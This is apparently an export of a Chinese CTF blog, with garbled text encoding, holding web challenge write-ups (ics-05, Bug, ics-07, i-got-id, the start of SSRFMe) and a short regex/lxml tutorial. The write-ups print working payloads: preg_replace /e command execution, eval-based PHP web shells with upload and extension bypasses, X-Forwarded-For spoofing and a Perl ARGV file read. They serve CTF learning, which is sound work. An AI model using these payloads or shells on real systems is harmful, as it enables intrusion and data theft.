<h4 id="0X05ics-05-20-03-14"><a href="#0X05ics-05-20-03-14" class="headerlink" title="0X05ics-05 20-03-14"></a>0X05ics-05 20-03-14</h4><p>æ‹¿åˆ°é¢˜ç›®åœ¨<code>http://111.198.29.45:59907/index.php?page=1</code>å‘ç°æ³¨å…¥ç‚¹ï¼Œçœ‹åˆ°åˆ°å˜é‡ä¼ å‚ï¼Œæœ‰å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»å–æºç ï¼Œåˆæ˜¯phpç«™ï¼Œæƒ³åˆ°ä½¿ç”¨phpä¼ªåè®®è¯»å–æºç </p>
<p><code>http://111.198.29.45:59907/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code></p>
<p>base64è§£å¯†ï¼Œæ•´ç†ä¸€ä¸‹æºç ï¼Œè¿™é‡Œå°±åªé™„ä¸Šé‡ç‚¹éƒ¨åˆ†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°é¦–å…ˆæ˜¯ä¸€ä¸ªåˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯è®¿é—®æ˜¯å¦æ¥è‡ªæœ¬æœºï¼Œç”¨X-Forwarded-Forè¿›è¡Œä¼ªé€ å³å¯</p>
<p>å†æ¥åˆ†æä¸€ä¸‹ä¸»é¢˜éƒ¨åˆ†ï¼Œé€šè¿‡getä¼ å…¥patternã€replacementã€subjectä¸‰ä¸ªå‚æ•°çš„å€¼ï¼Œé€šè¿‡preg_replace()å‡½æ•°ï¼Œåœ¨subjectæ‰¾æŒ‡å®šçš„patternéƒ¨åˆ†ç”¨replacementæ¥è¿›è¡Œæ›¿ä»£</p>
<p>é€šè¿‡æŸ¥æ‰¾èµ„æ–™äº†è§£äº†preg_replaceå‡½æ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg_replace å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</span><br><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</span><br><span class="line">æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ ä»¥ replacement è¿›è¡Œæ›¿æ¢ã€‚</span><br><span class="line">â€¢ $pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚</span><br><span class="line">â€¢ $replacement: ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚</span><br><span class="line">â€¢ $subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚</span><br><span class="line">â€¢ $limit: å¯é€‰ï¼Œå¯¹äºæ¯ä¸ªæ¨¡å¼ç”¨äºæ¯ä¸ª subject å­—ç¬¦ä¸²çš„æœ€å¤§å¯æ›¿æ¢æ¬¡æ•°ã€‚ é»˜è®¤æ˜¯-1ï¼ˆæ— é™åˆ¶ï¼‰ã€‚</span><br><span class="line">â€¢ $count: å¯é€‰ï¼Œä¸ºæ›¿æ¢æ‰§è¡Œçš„æ¬¡æ•°ã€‚</span><br><span class="line">è¿™ä¸ªå‡½æ•°æœ‰ä¸ªæ¼æ´</span><br><span class="line">å½“$patternä½¿ç”¨äº†&#x2F;eä¿®æ­£ç¬¦ï¼Œæ›¿æ¢çš„æ—¶å€™ä¼šæŠŠ$replacementæ›¿æ¢è¿›å»çš„ä»£ç å½“æˆphpä»£ç æ‰§è¡Œï¼Œå½“ç„¶è¦æ„æˆåˆæ³•çš„phpä»£ç æ‰èƒ½æ­£ç¡®æ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure>

<p>æ€è·¯å‡ºæ¥äº†ï¼Œç”¨burpæŠ“åŒ…</p>
<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/6.png" class="">

<p>å¯ä»¥çœ‹åˆ°é¡µé¢æˆåŠŸå›æ˜¾äº†</p>
<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/7.png" class="">

<p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;ls&quot;)&amp;&amp;sub=test</code></p>
<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/8.png" class="">

<p>ä¸‹é¢ä¸€æ­¥éœ€è¦æ³¨æ„ï¼Œç”±äºè¿™é‡Œå¯¹ç©ºæ ¼è¿›è¡Œäº†å¤„ç†ï¼Œå¯ä»¥ç”¨+æˆ–è€…%20æ¥æ›¿ä»£ï¼Œâ€œ&amp;â€ç”¨%26æ›¿ä»£</p>
<p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir%26%26+ls&quot;)&amp;&amp;sub=test</code></p>
<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/9.png" class="">

<p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir/flag%26%26+ls&quot;)&amp;&amp;sub=test</code></p>
<p>æ‰¾åˆ°äº†flag.phpæ–‡ä»¶ï¼Œè¿™é‡Œå°±ä¸è´´å›¾äº†</p>
<p>æœ€åç”¨catæ¥è¯»å–<code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cat+s3chahahaDir/flag/flag.php&quot;)&amp;&amp;sub=test</code></p>
<h4 id="0X06Bug-20-03-15"><a href="#0X06Bug-20-03-15" class="headerlink" title="0X06Bug  20-03-15"></a>0X06Bug  20-03-15</h4><p>æ‰“å¼€é¢˜ç›®åœºæ™¯æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæœ‰æ³¨å†Œå’Œä¿®æ”¹å¯†ç çš„é€‰é¡¹ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ä¸Šå»çœ‹çœ‹</p>
<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/10.png" class="">

<p>ç‚¹å‡»manageé€‰é¡¹ï¼Œæ— æ³•æ‰“å¼€ï¼Œæœ‰å¼¹çª—æç¤ºï¼šYou are not admin,å¾ˆæ˜æ˜¾éœ€è¦ç®¡ç†å‘˜è´¦å·ç™»å½•ï¼Œä½†æ˜¯æ³¨å†Œæ—¶æ˜¾ç¤ºè´¦å·å·²å­˜åœ¨ï¼Œçœ‹æ¥å…³é”®ç‚¹åœ¨ä¿®æ”¹å¯†ç çš„é¡µé¢ï¼ŒæŠ“åŒ…ï¼ŒæˆåŠŸå°†useræ”¹æˆadminï¼Œå†æ¬¡ç™»å½•ï¼Œç‚¹å‡»manageï¼Œæç¤ºIp not Allowed,æŠ“åŒ…ï¼ŒåŠ ä¸ŠX-Forwarded-For:127.0.0.1,æˆåŠŸæ‰“å¼€ï¼Œæ²¡ä»€ä¹ˆæç¤ºï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°ä¿¡æ¯</p>
<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/11.png" class="">

<p>æ ¹æ®æç¤ºä¼ å…¥å‚æ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:39291&#x2F;index.php?module&#x3D;filemanage&amp;do&#x3D;1&#x2F;&#x2F;æç¤ºaction is not correct</span><br><span class="line">å°è¯•å°†doæ”¹æˆdownloadï¼Œreadï¼Œwriteï¼Œuploadï¼Œæœ€åå‘ç°æ—¶upload</span><br></pre></td></tr></table></figure>

<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/12.png" class="">

<p>æ¥ä¸‹æ¥å°±æ˜¯ä¸Šä¼ æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åœ¨æµ‹è¯•ä¸­å‘ç°æœ‰&lt;?phpä¼šæŠ¥é”™ï¼Œè¿™å°±æƒ³åˆ°ç”¨phpçš„è„šæœ¬æ¨¡å¼</span><br><span class="line">æ„é€ å†…å®¹:</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&quot;cmd&quot;])&lt;&#x2F;script&gt;ä»¥phpåç¼€ä¸Šä¼ ï¼ŒburpæŠ“åŒ…</span><br></pre></td></tr></table></figure>

<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/13.png" class="">

<p>æ ¹æ®æç¤ºå°è¯•åç¼€åçš„ç»•è¿‡ï¼Œåœ¨è¿‡ç¨‹ä¸­å‘ç°å¯¹Content-Typeæœ‰è¿›è¡Œæ£€æµ‹ï¼Œå°†å…¶æ”¹ä¸ºimage/jpegï¼Œåç¼€ååœ¨å·²çŸ¥çš„ç»•è¿‡æ–¹æ³•ä¸­æœ€åå‘ç°php4|php5å¯ä»¥ï¼ŒæˆåŠŸæ‹¿åˆ°flag</p>
<h4 id="0X07ics-07-20-03-18"><a href="#0X07ics-07-20-03-18" class="headerlink" title="0X07ics-07 20-03-18"></a>0X07ics-07 20-03-18</h4><p>æ‰“å¼€ç•Œé¢ï¼Œå‘ç°é¡¹ç›®ç®¡ç†é¡µé¢æœ‰è·³è½¬ï¼Œæœ‰view-sourceå¯ä»¥çœ‹æºä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">        $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">        $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line">        $result = mysql_query($sql);</span><br><span class="line">        $result = mysql_fetch_object($result);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result = <span class="keyword">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</span><br><span class="line">      <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">floatval($_GET[id]) !== <span class="string">'1'</span><span class="comment">//æµ®ç‚¹æ•°ä¸èƒ½ä¸º1</span></span><br><span class="line">substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>)<span class="comment">//idçš„å€’æ•°æœ€åä¸€ä¸ªæ•°ä¸º9</span></span><br><span class="line">mysql_real_escape_stringï¼ˆ ï¼‰å‡½æ•°ä¼šåœ¨å•å¼•å·å‰åŠ \ä¾æ¬¡æ¥é˜²æ­¢sqlæ³¨å…¥</span><br><span class="line"><span class="comment">//è¿™é‡Œå¯ä»¥ç”¨1/9è¿›è¡Œç»•è¿‡</span></span><br></pre></td></tr></table></figure>

<p>è¿‡äº†è¿™ä¸€æ­¥æ¥çœ‹ä¸‹ä¸€æ®µä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</span><br><span class="line">       $con = $_POST[<span class="string">'con'</span>];</span><br><span class="line">       $file = $_POST[<span class="string">'file'</span>];</span><br><span class="line">       $filename = <span class="string">"backup/"</span>.$file;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">'uploaded'</span>);</span><br><span class="line">           $f = fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">           fwrite($f, $con);</span><br><span class="line">           fclose($f);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">$filename = <span class="string">"backup/"</span>.$file;<span class="comment">//backupæ˜¯ä¼ªè·¯å¾„ï¼Œè¿™é‡Œç”¨../å¯ä»¥ç»•è¿‡</span></span><br><span class="line">preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename)<span class="comment">//è¿™ä¸€æ®µæ­£åˆ™çœŸçš„æ²¡çœ‹æ‡‚ï¼Œçœ‹äº†å¤§ä½¬çš„wpè¯´æ˜¯åªè¿‡æ»¤åœ¨æœ€åä¸€ä¸ªç‚¹çš„åç¼€ï¼Œå¯ä»¥ç”¨/.æˆ–è€…ä¸¤ä¸ª.phpæ–‡ä»¶æ¥ç»•è¿‡</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:file=../<span class="number">4.</span>php/.&amp;con=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®uploaded/4.php</p>
<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/15.png" class="">

<p>ç”¨systemæ¥çˆ†å‡ºè·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æœ‰flag.php,ç”¨catæ¥è¯»å–ï¼Œåœ¨ç½‘é¡µæºç å¯ä»¥çœ‹åˆ°flag</p>
<p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ç”¨èœåˆ€è¿æ¥ï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†</p>
<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/14.png" class="">

<h4 id="0X08i-got-id-20-03-18"><a href="#0X08i-got-id-20-03-18" class="headerlink" title="0X08i-got-id 20-03-18"></a>0X08i-got-id 20-03-18</h4><p>æ‰“å¼€æœ‰ä¸‰ä¸ªè·³è½¬é“¾æ¥ï¼Œå…¶ä¸­ä¸€ä¸ªæç¤ºæ˜¯Perlï¼Œæœ‰ä¸€ä¸ªæ˜¯æ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œåº”è¯¥æ˜¯Perlæ–‡ä»¶ä¸Šä¼ ï¼Œå»ç™¾åº¦äº†ä»¥ä¸‹æœ‰å…³çš„çŸ¥è¯†ï¼ŒçŒœæµ‹ä¸€ä¸‹åå°çš„é€»è¾‘</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">my</span> $cgi=CGI-&gt;new;</span><br><span class="line"><span class="keyword">if</span>($cgi-&gt;upload(<span class="string">'file'</span>))&#123;</span><br><span class="line">	<span class="keyword">my</span> $file=$cgi-&gt;param(<span class="string">'file'</span>);</span><br><span class="line">		<span class="keyword">while</span> (&lt;$file&gt;)&#123;<span class="keyword">print</span> <span class="string">"$_"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">param()å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåˆ—è¡¨çš„æ–‡ä»¶ä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾å…¥åˆ°ä¸‹é¢çš„fileå˜é‡ä¸­ã€‚å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªARGVçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆPerlä¼šå°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åè¯»å‡ºæ¥ã€‚å¯¹æ­£å¸¸çš„ä¸Šä¼ æ–‡ä»¶è¿›è¡Œä¿®æ”¹,å¯ä»¥è¾¾åˆ°è¯»å–ä»»æ„æ–‡ä»¶çš„ç›®çš„</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ä¸Šä¼ ä¸€ä¸ªargvæ–‡ä»¶å†ä¸Šä¼ æ­£å¸¸çš„æ–‡ä»¶ï¼Œç”¨bashæ¥è¯»å–ç›®å½•</p>
<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/16.png" class="">

<p>æ¥ç€ç›´æ¥è¯»å–/flagï¼Œå°±å¯ä»¥äº†</p>
]]></content>
      <tags>
        <tag>train</tag>
      </tags>
  </entry>
  <entry>
    <title>çˆ¬è™«</title>
    <url>/2020/01/13/%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<h3 id="reæ¨¡å—"><a href="#reæ¨¡å—" class="headerlink" title="reæ¨¡å—"></a>reæ¨¡å—</h3><p>import re<a id="more"></a></p>
<h4 id="åŒ¹é…ä»»æ„å­—ç¬¦é™¤äº†æ¢è¡Œç¬¦"><a href="#åŒ¹é…ä»»æ„å­—ç¬¦é™¤äº†æ¢è¡Œç¬¦" class="headerlink" title=". åŒ¹é…ä»»æ„å­—ç¬¦é™¤äº†æ¢è¡Œç¬¦"></a>. åŒ¹é…ä»»æ„å­—ç¬¦é™¤äº†æ¢è¡Œç¬¦</h4><p>[â€¦] åŒ¹é…å­—ç¬¦é›†<br>\d/\D åŒ¹é…æ•°å­—/éæ•°å­—<br>\s/\S åŒ¹é…ç©ºç™½/éç©ºç™½å­—ç¬¦<br>\w/\WåŒ¹é…å•è¯å­—ç¬¦[a-zA-Z0-9]/éå•è¯å­—ç¬¦</p>
<p>*åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦0æ¬¡æˆ–è€…æ— é™æ¬¡</p>
<p>+åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦1æ¬¡æˆ–è€…æ— é™æ¬¡<br>ï¼Ÿ åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦0æ¬¡æˆ–è€…1æ¬¡<br>{m}/{m,n}åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦mæ¬¡æˆ–è€…næ¬¡<br>*? /+? /??åŒ¹é…æ¨¡å¼å˜ä¸ºéè´ªå©ª<br>^åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´<br>$åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾<br>\A/\ZæŒ‡å®šçš„å­—ç¬¦ä¸²åŒ¹é…å¿…é¡»å‡ºç°åœ¨å¼€å¤´/ç»“å°¾</p>
<h4 id="åŒ¹é…æ–¹å¼"><a href="#åŒ¹é…æ–¹å¼" class="headerlink" title="åŒ¹é…æ–¹å¼:"></a>åŒ¹é…æ–¹å¼:</h4><p>matchæ–¹æ³•ä»å¼€å¤´å¼€å§‹åŒ¹é…å†…å®¹ï¼Œå¤±è´¥è¿”å›None<br>searchæ‰«ææ•´ä¸ªåŒ¹é…å†…å®¹è¿”å›ç¬¬ä¸€ä¸ªæˆåŠŸçš„åŒ¹é…<br>compileç¼–è¯‘ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼<br>findallæ‰¾åˆ°æ‰€æœ‰åŒ¹é…çš„å­ä¸²ï¼Œå¹¶è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œæœªæ‰¾åˆ°åˆ™è¿”å›ç©ºåˆ—è¡¨<br>sub(æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ›¿æ¢å†…å®¹ï¼Œæ›¿æ¢ç›®æ ‡)<br>spilt(resï¼Œa)åˆ†å‰²</p>
<h3 id="lxmlåº“"><a href="#lxmlåº“" class="headerlink" title="lxmlåº“"></a>lxmlåº“</h3><h4 id="xpath"><a href="#xpath" class="headerlink" title="xpath"></a>xpath</h4><p>1.å®‰è£… pip install lxml<br>2.è¯­æ³•<br>(1)é€‰å–èŠ‚ç‚¹ï¼š<br>nodename  é€‰å–æ­¤èŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹<br>/         ä»æ ¹èŠ‚ç‚¹é€‰å–<br>//          ä»åŒ¹é…é€‰æ‹©çš„å½“å‰èŠ‚ç‚¹é€‰æ‹©æ–‡æ¡£ä¸­çš„èŠ‚ç‚¹ï¼Œä¸è€ƒè™‘ä½ç½®â€˜<br>.          é€‰å–å½“å‰èŠ‚ç‚¹<br>..          é€‰å–å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹<br>@          é€‰å–å±æ€§<br>(2)è°“è¯­<br>//title[@lang]    é€‰å–æ‰€æœ‰æ‹¥æœ‰åä¸º lang çš„å±æ€§çš„ title å…ƒç´ <br>//title[@lang=â€™engâ€™]    é€‰å–æ‰€æœ‰ title å…ƒç´ ï¼Œä¸”è¿™äº›å…ƒç´ æ‹¥æœ‰å€¼ä¸º eng çš„ lang å±æ€§<br>(3)é€‰å–æœªçŸ¥èŠ‚ç‚¹</p>
<p>â€˜*â€™åŒ¹é…ä»»ä½•å…ƒç´ èŠ‚ç‚¹<br>@â€æ˜Ÿå·â€    åŒ¹é…ä»»ä½•å±æ€§èŠ‚ç‚¹<br>node()    åŒ¹é…ä»»ä½•ç±»å‹çš„èŠ‚ç‚¹</p>
<p>lxmlä¸»è¦æ˜¯ä¸ºäº†ç”¨æ¥è§£æhtmlï¼Œä½œç”¨å’Œæ­£åˆ™åŒ¹é…å·®ä¸å¤šï¼Œä½†æ˜¯ä½¿ç”¨èµ·æ¥ä¼šæ›´åŠ æ–¹ä¾¿</p>
]]></content>
      <tags>
        <tag>climb</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘é¼æ¯2020ç„æ­¦ç»„SSRFMe</title>
    <url>/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/</url>
    <content><![CDATA[<p>ç½‘é¼æ¯ç„æ­¦ç»„çš„é¢˜å¤ªæ·¦äº†ï¼Œåšäº†ä¸€ä¸‹åˆï¼Œæ˜¯æˆ‘å¤ªèœäº†23333<a id="more"></a></p>
<h3 id="çŸ¥è¯†é¢„å¤‡"><a href="#çŸ¥è¯†é¢„å¤‡" class="headerlink" title="çŸ¥è¯†é¢„å¤‡"></a>çŸ¥è¯†é¢„å¤‡</h3><p>1.ä¸åŒURLç³»æ¬¸å…¶åœ¨ä¸€èµ·å¾—åˆ°ç»“æœä¸ä¸€è‡´äº§ç”Ÿè¢«åˆ©ç”¨çš„å¯èƒ½</p>
<p>2.redisä¸»ä»å¤åˆ¶</p>
<p>3.å¯¹rogue-serveræµæ°“æœåŠ¡å™¨çš„äº†è§£</p>
<p>4.å¯¹gopheråè®®çš„äº†è§£ä»¥åŠredisSSRFè§¦å‘ä¸»ä»åå¼¹shell å¯¹çš„æ“ä½œ</p>
<h3 id="é¢˜è§£æµç¨‹"><a href="#é¢˜è§£æµç¨‹" class="headerlink" title="é¢˜è§£æµç¨‹"></a>é¢˜è§£æµç¨‹</h3><p>å¼€é¢˜é€æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span>,$url);</span><br><span class="line">    <span class="keyword">if</span> (!$match_result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $url_parse=parse_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>];</span><br><span class="line">    $ip=gethostbyname($hostname);</span><br><span class="line">    $int_ip=ip2long($ip);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $result_info = curl_getinfo($ch);</span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">        safe_request_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„check_inner_ip()æ–¹æ³•ä¸­ç”¨parse_url()æ¥æ£€éªŒæ˜¯å¦ä¸ºå†…ç½‘IPï¼Œå¦‚æœä¸æ˜¯å†…ç½‘ipå°±è°ƒç”¨curlçš„æ–¹æ³•è¯·æ±‚urlè¿”å›ç»“æœã€‚</p>
<p>å…³äºè¿™ä¸¤è€…ä¸€èµ·ç”¨çš„æ—¶å€™äº§ç”Ÿçš„æ¼æ´ï¼Œæ‰¾äº†ä¸€ç¯‡æ–‡ç« <a href="https://www.anquanke.com/post/id/86527ï¼Œå€Ÿç”¨æ–‡ç« é‡Œçš„å›¾æ¥è¯´æ˜" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86527ï¼Œå€Ÿç”¨æ–‡ç« é‡Œçš„å›¾æ¥è¯´æ˜</a></p>
<img src="/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/1.png" class="">

